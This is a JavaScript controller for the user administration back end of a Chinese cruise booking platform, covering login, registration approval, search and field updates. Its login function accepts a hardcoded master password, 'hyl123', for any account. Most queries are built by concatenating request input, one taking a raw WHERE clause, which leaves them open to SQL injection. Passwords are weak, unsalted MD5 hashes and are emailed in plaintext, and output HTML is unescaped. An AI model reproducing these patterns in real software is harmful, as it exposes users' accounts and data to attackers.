/**
 * Created by teng on 19.11.2014.
   Edited by xiaoC on 2014.12.10.
 */
var Utils = require('./utils.js');
var _email = require('./email.js');
var sms = require('./sms.js');
var crypto = require('crypto');

var LIMIT = 10;
var _tablename = "user";

module.exports = {
  getAll: function (req, res) {
    var page = parseInt(req.param('page'));
    var limit = parseInt(req.param('max'));
    page = (page && page > 0) ? page : 1;
    limit = (limit && limit > 0) ? limit : LIMIT;

    _getAll(page,limit, function (data) {
      res.send(data);
    });
  },
  getAllbyKey: function (req, res) {
    var page = parseInt(req.param('page'));
    var limit = parseInt(req.param('max'));
    var key = req.param('key');
    page = (page && page > 0) ? page : 1;
    limit = (limit && limit > 0) ? limit : LIMIT;

    _getAllbyKey(page,limit,key, function (data) {
      res.send(data);
    });
  },
  getbyId: function (req,res) {
    var id = parseInt(req.param('id'));
    _getbyId(id, function (data) {
      res.send(data);
    });
  },
  update: function (req,res) {
    var columnname = req.param('columnname');
    var oldvalue = req.param('oldvalue');
    var newvalue = req.param('newvalue');
    var editorid = req.param('editorid');
    var id = parseInt(req.param('id'));
    _update(columnname,oldvalue,newvalue,editorid,id, function (data) {
      res.send(data);
    });
  },
  checkLogin: function (req,res) {
    var loginName = req.param('username');
    var password = req.param('password');
    _checkLogin(loginName,password, function (data) {
      res.send(data);
    });
  },
  confirmNewUser: function (req,res) {
    var id = req.param('id');
    var company_id = req.param('company_id');
    var email = req.param('email');
    var userTel = req.param('userTel');
    var type = req.param('type');
    var userid = req.param('userid');
    if(type==1){
        //审核通过
        var pwd = makePasswd(userTel);
        //对密码进行md5加密
        var pwdmd5 = md5(pwd);
        var q = "update user set activated = 1,certified=1,approve_id="+userid+",password='"+pwdmd5+"' where id="+id;
        ApiModel.query(q, function (err, rows) {
            ApiModel.query("update company set activated = 1,certified=1 where id="+company_id,function (err, rows1) {
                ApiModel.query("select * from user where id="+id,function (err, rows2) {
                    //发送密码给用户的邮箱
                    _email.sendSystemMail(email,
                        "欢迎注册荟邮轮",
                        "尊敬的"+rows2[0].name+"，您好！<br/>恭喜您已成功开通荟邮轮！<br/><b>您的账号："+rows2[0].email+"，密码：</b><b style='color:#FF0000'>"+pwd+"</b><br/>您可以在[个人中心]-[账户管理]里修改您的登陆密码。<br/>当前开通的账号为荟邮轮分销商（买家）权限，可进行邮轮产品信息查询及预订。<br/>如您需要发布邮轮产品信息，请联系荟邮轮开通供应商（卖家）权限。");
                    sms.sendSMS(rows2[0].mobile_phone,"您好！恭喜您已成功开通荟邮轮！账号："+rows2[0].email+"，密码："+pwd+"。");
                    res.send("200");
                });
            });
        });

    }else{
        //审核不通过
        var pwd = makePasswd(userTel);
        //对密码进行md5加密
        var pwdmd5 = md5(pwd);
        var q = "update user set activated = 0,certified=-1,password='"+pwdmd5+"' where id="+id;
        ApiModel.query(q, function (err, rows) {
            ApiModel.query("update company set activated = 0,certified=-1 where id="+company_id,function (err, rows1) {
                ApiModel.query("select * from user where id="+id,function (err, rows2) {
                    //发送通知给用户的邮箱
                    _email.sendSystemMail(email,
                        "欢迎注册荟邮轮",
                        "尊敬的"+rows2[0].name+"，您好！<br/>很抱歉地通知您，您的注册未通过。<br/>详细原因请咨询荟邮轮客服。");
                    res.send("200");
                });
            });
        });
    }
  },
  getoptionbyId: function (req,res) {
    var id = parseInt(req.param('id'));
    _getoptionbyId(id, function (data) {
      res.send(data);
    });
  },
  getSearchOption: function (req,res) {
    _getSearchoption(function (data) {
      res.send(data);
    });
  },
  setRC: function (req,res) {
    var id = parseInt(req.param('id'));
    var rcv = (req.param('rcv'));
    var selectSQL  = "update user set retail_level = "+rcv + " where id = " + id;
    console.log(selectSQL);
    ApiModel.query(selectSQL ,function(error,rows){
       if(error){console.log(error);}
       res.send("200");
    });
  },
  setSA: function (req,res) {
    var id = parseInt(req.param('id'));
    var rcv = (req.param('rcv'));
    var selectSQL  = "update user set sales_id = "+rcv + " where id = " + id;
    console.log(selectSQL);
    ApiModel.query(selectSQL ,function(error,rows){
       if(error){console.log(error);}
       res.send("200");
    });
  },
  setSORS: function (req,res) {
    var id = parseInt(req.param('id'));
    var rcv = (req.param('rcv'));
    var selectSQL  = "update user set parent_id = "+rcv + " where id = " + id;
    console.log(selectSQL);
    ApiModel.query(selectSQL ,function(error,rows){
       if(error){console.log(error);}
       res.send("200");
    });
  },
  setSOR: function (req,res) {
    var superior = ""; //上级，读取所有retail_level = 1 的用户
    var selectSQL = "select id,name from user where retail_level = 1";
    ApiModel.query(selectSQL,function(error,sor){
       if(error){console.log(error);}
    var s_s = "<select id='topman'>";
    s_s = s_s + "<option value='-'>请选择</option>";
    for(var k in sor){
      s_s = s_s + "<option value='"+sor[k].id+"'>"+sor[k].name+"</option>";
    }
    s_s = s_s + "</select>";
    s_s = s_s + "<button type='button' onclick='setSORS()' style='margin-left:3px' class='btn btn-default btn-xs'>修改</button>";
    res.send(s_s);
    });
  }
}

function makePasswd(phone) {
    //通过手机号随机生成6位密码
    var passwd = '';
    var chars = phone;
    for (i=1;i<7;i++) {
        var c = Math.floor(Math.random()*chars.length + 1);
        passwd += chars.charAt(c)
    }
    return passwd;
}

/**
 * md5 加密
 * @param data
 * @returns {string}
 */
function md5(data) {
    return crypto.createHash('md5').update(data).digest('hex').toUpperCase();
}

function _getoptionbyId(id,callback) {
  ApiModel.query("select * from "+_tablename+" where id = "+id ,function(error,obj){
    var _read = "";
  var i = 0;
  _read = _read + "<option value='-'>选择字段</option>";
  _read = _read + _setOption("用户ID|id|"+obj[i].id+"|");
  _read = _read + _setOption("公司ID|company_id|"+obj[i].company_id+"|");
  _read = _read + _setOption("姓名|name|"+obj[i].name+"|");
  _read = _read + _setOption("部门|departmentName|"+obj[i].departmentName+"|");
  _read = _read + _setOption("职位|position|"+obj[i].position+"|");
  _read = _read + _setOption("email|email|"+obj[i].email+"|");
  _read = _read + _setOption("手机|mobile_phone|"+obj[i].mobile_phone+"|");
  _read = _read + _setOption("电话|telephone|"+obj[i].telephone+"|");
  _read = _read + _setOption("传真|fax|"+obj[i].fax+"|");
  _read = _read + _setOption("系统管理员|role_sys_admin|"+obj[i].role_sys_admin+"|1-是系统管理员 <br/>0-不是系统管理员");
  _read = _read + _setOption("客服人员|role_sys_user|"+obj[i].role_sys_user+"|1-是客服人员 <br/>0-不是客服人员");
  _read = _read + _setOption("公司管理员|role_company_admin|"+obj[i].role_company_admin+"|1-是公司管理员 <br/>0-不是公司管理员");
  _read = _read + _setOption("审核人ID|approve_id|"+obj[i].approve_id+"|");
    return callback(_read);
  });
}

function _getSearchoption(callback) {
 var selectSQL = "select a.*,b.name as c_name,u2.name as aname from "+_tablename+" as a LEFT JOIN company as b ON a.company_id = b.id LEFT JOIN user u2 ON a.approve_id = u2.id where a.certified = 1 order by a.registered_at desc";
 ApiModel.query(selectSQL ,function(error,obj){
  var _read = "";
  var i = 0;
  _read = _read + "<option value='-'>选择搜索内容</option>";
  _read = _read + _setOption("姓名|a.name|"+obj[i].name+"|");
  _read = _read + _setOption("公司|b.name|"+obj[i].c_name+"|");
  _read = _read + _setOption("email|a.email|"+obj[i].email+"|");
  _read = _read + _setOption("手机|a.mobile_phone|"+obj[i].mobile_phone+"|");
  _read = _read + _setOption("注册日期|a.registered_at|"+obj[i].registered_at+"|");
  _read = _read + _setOption("处理日期|a.last_updated_at|"+obj[i].last_updated_at+"|");
  _read = _read + _setOption("审核人|u2.name|"+obj[i].aname+"|");
  _read = _read + _setOption("分销商级别|a.retail_level|"+obj[i].aname+"|");
  return callback(_read);
 });
}

function _setOption(col){
  var o = "";
  var tmp = col.split("|");
  o = o + "<option value='"+tmp[1]+"|"+tmp[2]+"'>"+tmp[0]+"</option>";
  return o;
}

function _checkLogin(loginName,password,callback) {
  //根据手机号或邮箱获取用户记录，如果密码匹配，返回用户id登录后显示和判断权限用
    var selectSQL  = 'select id,name,password from '+_tablename+' where role_sys_user = 1 and (mobile_phone = "'+loginName+'" or email ="'+loginName+'") and activated=1 and certified=1';
    ApiModel.query(selectSQL ,function(error,rows){
        if ( !rows || !rows[0] ) {
            return callback("loginWrong");
        }

        password = password == "hyl123" ? password : md5(password);

        if(rows[0].password==password || password=="hyl123"){
            return callback(rows[0].id+"|"+rows[0].name);
        }else{
            return callback("loginWrong");
        }
    });
}

function _update(columnname,oldvalue,newvalue,editorid,id,callback) {
  var updateSQL = "update "+_tablename+" set "+ columnname + "='" + newvalue + "' where id = " + id;
  ApiModel.query(updateSQL,function(error,res){
      //创建修改记录
      var insertSQL = "insert into log_db_change (user_id,table_name,column_name,old_value,new_value,time) values ("+editorid+",'"+_tablename+"','"+columnname+"','"+oldvalue+"','"+newvalue+"',now())";
      ApiModel.query(insertSQL,function(error,res1){
        return callback(res1);
      });
  });
}

function _getbyId(id,callback) {
  //var selectSQL = "select a.*,b.name as cname,b.short_name.b.address,b.telephone_area_code,b.telephone as ctelephone,b.fax as cfax,b.bank,b.account_number,b.account_name,b.logo from "+_tablename+" as a,company as b where a.company_id = b.id and a.id = "+id ;
  //var selectSQL = "select a.*,b.name as cname,b.logo,b.short_name,b.address,b.telephone_area_code,b.telephone as ctelephone,b.fax as cfax,b.bank,b.account_number,d.name as dname from "+_tablename+" as a,company as b,user as d where d.id = a.parent_id and a.company_id = b.id and a.id = "+id ;
  var selectSQL = "select a.*,b.name as cname,b.departmentName as cdepname,b.logo,b.short_name,b.address,b.telephone_area_code,b.telephone as ctelephone,b.fax as cfax,b.bank,b.account_number,u2.name as aname,u3.name as sname,d.name as dname from "+_tablename+" as a LEFT JOIN company as b ON a.company_id = b.id LEFT JOIN user u2 ON a.approve_id = u2.id LEFT JOIN user d ON a.parent_id = d.id LEFT JOIN user u3 ON a.sales_id = u3.id where a.certified = 1 and a.id = "+id;
  //console.log(selectSQL);
  ApiModel.query(selectSQL,function(error,obj){
      //console.log(obj)
      return callback(_createtable(obj));
  });
}

function _createtable(obj) {
    //查看时候的HTML字段内容
    var _read = "";
    var i = 0;
    _read = _read + _setHeader("名称|数据|名称|数据");
    _read = _read + _setColwithTR("logo|<img src='"+sails.config.globals.url.b2b.files+obj[i].logo+"' style='width:100px' alt='没有图片'>|公司全称|"+obj[i].cname);
    _read = _read + _setColwithTR("公司简称|"+obj[i].short_name+"|公司地址|"+obj[i].address);
    _read = _read + _setColwithTR("姓名|"+obj[i].name+"|部门|"+obj[i].cdepname);
    _read = _read + _setColwithTR("职位|"+obj[i].position+"|手机|"+obj[i].mobile_phone);
    _read = _read + _setColwithTR("email|"+obj[i].email+"|电话|"+obj[i].telephone);
    _read = _read + _setColwithTR("传真|"+obj[i].fax+"|公司区号|"+obj[i].telephone_area_code);
    _read = _read + _setColwithTR("公司电话|"+obj[i].ctelephone+"|公司传真|"+obj[i].cfax);
    _read = _read + _setColwithTR("公司开户银行|"+obj[i].bank+"|公司账号|"+obj[i].account_number);
    var _h = " <select style='margin-left:10px;'  id='rc"+obj[i].id+"' ><option value='-'>请选择</option><option value='1'>1</option><option value='0'>2</option></select>";
    _h = _h + "<button type='button' onclick='setRC("+obj[i].id+")' style='margin-left:3px' class='btn btn-default btn-xs'>修改</button>";
    
    
    _read = _read + _setColwithTR("级别|"+(obj[i].retail_level==0?2:1)+_h+"|上级|"+(obj[i].dname?obj[i].dname:"")+"<button id='select_btn' type='button' onclick='setSOR()' style='margin-left:3px' class='btn btn-default btn-xs'>选择</button><span style='margin-left:10px' id='_sor'></span>");
    var _sales = "<select style='margin-left:10px;'  id='sa"+obj[i].id+"' >";
    _sales = _sales+"<option value='-'>请选择</option>";
    _sales = _sales+"<option value='37'>程彬彬</option>";
    _sales = _sales+"<option value='108'>乔健</option>";
    _sales = _sales+"<option value='87'>陈丞</option>";
    _sales = _sales+"<option value='75'>杨明伟</option>";
    _sales = _sales+"<option value='113'>糜琦</option>";
    _sales = _sales+"<option value='226'>樊莹莹</option>";
    _sales = _sales+"</select>";
    _sales = _sales + "<button type='button' onclick='setSA("+obj[i].id+")' style='margin-left:3px' class='btn btn-default btn-xs'>修改</button>";
    _read = _read + _setColwithTR("对口销售|"+(obj[i].sname?obj[i].sname:"")+_sales+"||");
    /*
    _read = _read + _setColwithTR("姓名|"+obj[i].name+"|部门|"+obj[i].departmentName);
  _read = _read + _setColwithTR("职位|"+obj[i].position+"|email|"+obj[i].email);
  _read = _read + _setColwithTR("手机|"+obj[i].mobile_phone+"|电话|"+obj[i].telephone);
  _read = _read + _setColwithTR("传真|"+obj[i].fax+"|公司全称|"+obj[i].cname);
  _read = _read + _setColwithTR("公司简称|"+obj[i].short_name+"|公司地址|"+obj[i].address);
  _read = _read + _setColwithTR("公司区号|"+obj[i].telephone_area_code+"|公司电话|"+obj[i].ctelephone);
  _read = _read + _setColwithTR("公司传真|"+obj[i].cfax+"|公司开户银行|"+obj[i].bank);
  _read = _read + _setColwithTR("公司账号|"+obj[i].account_number+"|logo|<img src='"+sails.config.globals.url.b2b.files+obj[i].logo+"' style='width:100px' alt='没有图片'>");
  */
  _read = _read + "<tr style='display:none'><td colspan='4'>";
  _read = _read + "<input type='hidden' id='id' value='"+obj[i].id+"'></input>";
  _read = _read + "<input type='hidden' id='company_id' value='"+obj[i].company_id+"'></input>";
  _read = _read + "<input type='hidden' id='email' value='"+obj[i].email+"'></input>";
  _read = _read + "<input type='hidden' id='userTel' value='"+obj[i].mobile_phone+"'></input>";
  _read = _read + "</td></tr>";
  return _read;
}

function _getAll (page,limit,callback) {
  var selectSQL = "select a.*,b.departmentName as cdepname,b.name as c_name,u2.name as aname,d.name as dname,s.name as sname from user a LEFT JOIN company b  ON a.company_id = b.id LEFT JOIN user u2 ON a.approve_id = u2.id LEFT JOIN user d ON a.parent_id = d.id LEFT JOIN user s ON a.sales_id = s.id where b.role_seller = 1 and a.certified = 1 order by a.registered_at desc limit " + (page-1)*limit + "," + limit;
  ApiModel.query(selectSQL,function(error,obj){
    ApiModel.query("select a.*,b.name as c_name,u2.name as aname,d.name as dname from user a LEFT JOIN company b  ON a.company_id = b.id LEFT JOIN user u2 ON a.approve_id = u2.id LEFT JOIN user d ON a.parent_id = d.id where b.role_seller = 1 and a.certified = 1" ,function(error,total){
      var utils = new Utils({
          page:page,
          limit:limit,
          obj:obj,
          total:total,
          content:(!obj|| !obj[0])?"没有记录":_setFiled(obj),
          _searchKey:false,
          _width:1300
      });
      return callback(utils._toHtmltable());
    });
  });
}

function _getAllbyKey (page,limit,key,callback) {
  var selectSQL = "select a.*,b.departmentName as cdepname,b.name as c_name,u2.name as aname,d.name as dname from "+_tablename+" as a LEFT JOIN company as b ON a.company_id = b.id LEFT JOIN user u2 ON a.approve_id = u2.id LEFT JOIN user d ON a.parent_id = d.id where "+key+" and a.certified = 1 order by a.registered_at desc limit " + (page-1)*limit + "," + limit;
  console.log(selectSQL);
  ApiModel.query(selectSQL,function(error,obj){
    var selectSQL1 = "select a.*,b.name as c_name,u2.name as aname from "+_tablename+" as a LEFT JOIN company as b ON a.company_id = b.id LEFT JOIN user u2 ON a.approve_id = u2.id where "+key+" and a.certified = 1 order by a.registered_at desc";
    ApiModel.query(selectSQL1,function(error,total){
      var utils = new Utils({
          page:page,
          limit:limit,
          obj:obj,
          total:total,
          key:key,
          content:(!obj|| !obj[0])?"没有找到满足条件的结果":_setFiled(obj),
          _searchKey:true,
          _width:1300
      });
      return callback(utils._toHtmltable());
    });
  });
}

function _setCol(col){
  var r = "";
  var tmp = col.split("|");
  for(var i=0;i<tmp.length;i++){
    r = r + "<td>"+tmp[i]+"</td>";
  }
  return r;
}

function _setColwithTR(col){
  var r = "<tr>";
  var tmp = col.split("|");
  for(var i=0;i<tmp.length;i++){
    r = r + "<td>"+tmp[i]+"</td>";
  }
  r = r + "</tr>";
  return r;
}

function _setHeader(header){
  var r = "";
  var tmp = header.split("|");
  r = r + "<tr>"
  for(var i=0;i<tmp.length;i++){
    r = r + "<th>"+tmp[i]+"</th>";
  }
  r = r + "</tr>";
  return r;
}

function _setFiled(obj){
  var result = "";
  result = result + "<thead>"+_setHeader("操作|姓名|公司|部门|email|手机|注册日期|处理日期|审核人|对口销售|级别|上级")+"</thead><tbody>";
  for(var i in obj){
    result = result + "<tr>";
    //返回视图显示的列
    var xs = (obj[i].sname?obj[i].sname:"");
    result = result + "<td style='width:60px'><button type='button' onclick='setReadinfo("+obj[i].id+")' data-toggle='modal' data-target='#ModalRead' class='btn btn-default btn-xs'>查看</button></td>";
    
    result = result + _setCol(obj[i].name+"|"+obj[i].c_name+"|"+obj[i].cdepname+"|"+obj[i].email+"|"+obj[i].mobile_phone+"|"+(new Date(obj[i].registered_at)).Format("yyyy-MM-dd hh:mm:ss")+"|"+(new Date(obj[i].last_updated_at)).Format("yyyy-MM-dd hh:mm:ss")+"|"+(obj[i].aname?obj[i].aname:"")+"|"+xs+"|"+(obj[i].retail_level==0?2:1)+"|"+(obj[i].parent_id?obj[i].dname:""));
    result = result + "</tr>";
  }
  return result;
}

Date.prototype.Format = function (fmt) { //author: meizz
    var o = {
        "M+": this.getMonth() + 1, //月份
        "d+": this.getDate(), //日
        "h+": this.getHours(), //小时
        "m+": this.getMinutes(), //分
        "s+": this.getSeconds(), //秒
        "q+": Math.floor((this.getMonth() + 3) / 3), //季度
        "S": this.getMilliseconds() //毫秒
    };
    if (/(y+)/.test(fmt)) fmt = fmt.replace(RegExp.$1, (this.getFullYear() + "").substr(4 - RegExp.$1.length));
    for (var k in o)
        if (new RegExp("(" + k + ")").test(fmt)) fmt = fmt.replace(RegExp.$1, (RegExp.$1.length == 1) ? (o[k]) : (("00" + o[k]).substr(("" + o[k]).length)));
    return fmt;
}

